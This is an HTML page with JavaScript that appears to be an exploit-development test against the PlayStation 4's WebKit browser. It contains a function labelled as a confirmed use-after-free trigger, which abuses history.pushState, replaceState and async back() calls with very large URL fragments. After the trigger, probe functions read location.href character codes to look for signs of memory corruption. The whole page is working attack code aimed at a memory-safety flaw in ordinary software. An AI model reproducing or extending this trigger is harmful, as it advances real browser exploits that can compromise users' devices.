<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – UAF Hot Entropy Test (Reconstructed)</title>
<style>
body { background:#000; color:#0f0; font-family: monospace; }
button { font-size:16px; margin:6px; }
pre { white-space: pre-wrap; }
</style>
</head>
<body>

<button onclick="run()">RUN (sem reload)</button>
<button onclick="clearLog()">CLEAR LOG</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById('log');
function log(s){ logEl.textContent += s + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

function probe(tag){
    let s = location.href;
    log(`[${tag}] URL.length = ${s.length}`);
    [16,32,48,64,96,128,256].forEach(o=>{
        try {
            log(`[${tag}] cc(${o}) = ${s.charCodeAt(o)}`);
        } catch(e){
            log(`[${tag}] cc(${o}) = EXC`);
        }
    });
}

/* ===============================
   CONFIRMED UAF TRIGGER (AS-IS)
   =============================== */
async function triggerUAF(){
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i === 18 || i === 24 || i === 30){
            probe(`MID-${i}`);
        }

        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(`[ITER ${i}] back() async`);
        }

        size += STEP;
        await sleep(5);
    }
    log(">>> UAF WINDOW <<<");
}

async function run(){
    log("\n================ RUN ================");
    log(`[STATE] history.length = ${history.length}`);
    log(`[STATE] URL.length = ${location.href.length}`);

    await triggerUAF();

    // Leituras “quentes”, sem estabilizar heap
    probe("POST-IMM");

    Promise.resolve().then(()=>probe("POST-MICRO"));
    requestAnimationFrame(()=>probe("POST-RAF"));
    setTimeout(()=>probe("POST-T0"), 0);
    setTimeout(()=>probe("POST-T-RAND"), Math.random()*10);

    log("=============== END RUN ===============\n");
}

function clearLog(){
    logEl.textContent = "";
}
</script>

</body>
</html>
